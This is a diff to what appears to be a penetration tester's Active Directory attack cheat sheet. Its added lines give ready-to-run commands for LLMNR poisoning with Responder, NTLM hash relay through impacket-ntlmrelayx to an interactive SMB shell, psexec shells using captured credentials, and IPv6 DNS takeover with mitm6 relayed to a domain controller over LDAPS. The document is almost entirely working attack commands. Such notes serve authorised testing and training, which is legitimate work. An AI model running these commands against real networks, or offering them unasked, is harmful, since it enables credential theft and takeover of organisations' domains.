@@ -108,3 +108,19 @@ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
 # active directory - LLMNR poisoning - grabbing hashes with responder
 sudo responder -I eth0 -rdw
 cat /usr/share/responder/logs/SMB* > loot/[CLIENT].hashes
+
+# active directory - pass the hash - relaying captured hashes through SMB
+sudo nano /etc/responder/Responder.conf
+# turn off SMB and HTTP
+sudo responder -I eth0 -rdwv
+# leave that running and open a new tab for the relay
+impacket-ntlmrelayx -tf targets.txt -smb2support -i
+# if successful an interactive SMB shell will be spawned, which we cann connect to withnetcat (or similar)
+nc 127.0.0.1 11000
+# we can likely get a full shell with those credentials through psexec
+impacket-psexec [DOMAIN]/[USER]:[PASS]@[RHOST]
+
+# active directory - IPv6 - DNS takeover with mitm6
+sudo python3 mitm6.py -d [DOMAIN]
+# we can relay captured credentials from that (usually triggered on a machine reboot) using ntlmrelayx
+impacket-ntlmrelayx -6 -t ldaps://[DC IP] -wh fakewpad.[DOMAIN] -l enumeration
